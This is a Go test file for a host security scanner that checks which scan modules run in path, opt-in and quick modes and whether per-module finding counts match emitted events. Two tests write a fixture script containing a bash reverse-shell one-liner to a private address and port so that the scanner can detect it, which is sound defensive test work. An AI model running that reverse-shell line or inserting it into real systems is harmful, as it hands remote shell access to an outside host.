package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/scanner"
)

func TestScanner_PathOnly_RunsOnlyFilesystemByDefault(t *testing.T) {
	tmpDir := t.TempDir()
	suspiciousFile := filepath.Join(tmpDir, ".backdoor.sh")
	// Shell script with suspicious reverse shell payload
	_ = os.WriteFile(suspiciousFile, []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"), 0755)

	cfg := config.NewDefaultConfig()
	cfg.Scan.Paths = []string{tmpDir}
	cfg.Scan.ExplicitPaths = true
	cfg.Scan.Threads = 2

	bus := events.NewEventBus()
	defer bus.Close()

	sub := bus.Subscribe()
	defer sub.Close()

	s := scanner.NewScanner(cfg, bus, nil, nil)

	var modulesStarted []string
	var findings []events.FindingRaised

	done := make(chan struct{})
	go func() {
		defer close(done)
		for ev := range sub.Events() {
			switch e := ev.(type) {
			case events.ModuleStarted:
				modulesStarted = append(modulesStarted, e.ModuleName)
			case events.FindingRaised:
				findings = append(findings, e)
			}
		}
	}()

	err := s.Run(context.Background())
	if err != nil {
		t.Fatalf("unexpected scan error: %v", err)
	}

	bus.Close()
	<-done

	// Verify only filesystem module started
	if len(modulesStarted) != 1 || modulesStarted[0] != "filesystem" {
		t.Errorf("expected only [filesystem] module to run by default with --path, got: %v", modulesStarted)
	}

	// Verify all findings come strictly from the target path
	for _, f := range findings {
		if !strings.HasPrefix(f.Finding.Path, tmpDir) {
			t.Errorf("expected finding to be within %s, got: %s", tmpDir, f.Finding.Path)
		}
	}
}

func TestScanner_PathWithModulesOptIn(t *testing.T) {
	tmpDir := t.TempDir()
	suspiciousFile := filepath.Join(tmpDir, ".backdoor.sh")
	_ = os.WriteFile(suspiciousFile, []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"), 0755)

	cfg := config.NewDefaultConfig()
	cfg.Scan.Paths = []string{tmpDir}
	cfg.Scan.ExplicitPaths = true
	cfg.Scan.Modules = []string{"filesystem", "users"}
	cfg.Scan.Threads = 2

	bus := events.NewEventBus()
	defer bus.Close()

	sub := bus.Subscribe()
	defer sub.Close()

	s := scanner.NewScanner(cfg, bus, nil, nil)

	var modulesStarted []string
	done := make(chan struct{})
	go func() {
		defer close(done)
		for ev := range sub.Events() {
			if e, ok := ev.(events.ModuleStarted); ok {
				modulesStarted = append(modulesStarted, e.ModuleName)
			}
		}
	}()

	err := s.Run(context.Background())
	if err != nil {
		t.Fatalf("unexpected scan error: %v", err)
	}

	bus.Close()
	<-done

	// Verify both users and filesystem modules started, but not process/persistence/network/kernel
	expectedMap := map[string]bool{"users": true, "filesystem": true}
	for _, m := range modulesStarted {
		if !expectedMap[m] {
			t.Errorf("unexpected module %s started when --modules filesystem,users was configured", m)
		}
	}
	if len(modulesStarted) != 2 {
		t.Errorf("expected 2 modules (users, filesystem), got: %v", modulesStarted)
	}
}

func TestScanner_QuickRunsAllModules(t *testing.T) {
	cfg := config.NewDefaultConfig()
	cfg.Scan.Quick = true
	cfg.Scan.Threads = 2

	bus := events.NewEventBus()
	defer bus.Close()

	sub := bus.Subscribe()
	defer sub.Close()

	s := scanner.NewScanner(cfg, bus, nil, nil)

	var modulesStarted []string
	done := make(chan struct{})
	go func() {
		defer close(done)
		for ev := range sub.Events() {
			if e, ok := ev.(events.ModuleStarted); ok {
				modulesStarted = append(modulesStarted, e.ModuleName)
			}
		}
	}()

	err := s.Run(context.Background())
	if err != nil {
		t.Fatalf("unexpected scan error: %v", err)
	}

	bus.Close()
	<-done

	// Verify all 7 modules (process, persistence, users, network, kernel, container, filesystem) ran in quick mode
	allExpected := []string{"process", "persistence", "users", "network", "kernel", "container", "filesystem"}
	startedMap := make(map[string]bool)
	for _, m := range modulesStarted {
		startedMap[m] = true
	}
	for _, exp := range allExpected {
		if !startedMap[exp] {
			t.Errorf("expected module %s to start in quick mode, but was missing from: %v", exp, modulesStarted)
		}
	}
}

func TestScanner_ModuleFindingsCount_MatchesEmittedFindings(t *testing.T) {
	cfg := config.NewDefaultConfig()
	cfg.Scan.Quick = true
	cfg.Scan.Threads = 2

	bus := events.NewEventBus()
	defer bus.Close()

	sub := bus.Subscribe()
	defer sub.Close()

	s := scanner.NewScanner(cfg, bus, nil, nil)

	moduleReportedCounts := make(map[string]int)
	moduleEmittedCounts := make(map[string]int)

	done := make(chan struct{})
	go func() {
		defer close(done)
		for ev := range sub.Events() {
			switch e := ev.(type) {
			case events.ModuleFinished:
				moduleReportedCounts[e.ModuleName] = e.FindingsCount
			case events.FindingRaised:
				moduleEmittedCounts[e.Finding.Module]++
			}
		}
	}()

	err := s.Run(context.Background())
	if err != nil {
		t.Fatalf("unexpected scan error: %v", err)
	}

	bus.Close()
	<-done

	for modName, reportedCount := range moduleReportedCounts {
		emittedCount := moduleEmittedCounts[modName]
		if reportedCount != emittedCount {
			t.Errorf("module %q reported Findings: %d in ModuleFinished, but emitted %d FindingRaised events",
				modName, reportedCount, emittedCount)
		}
	}
}
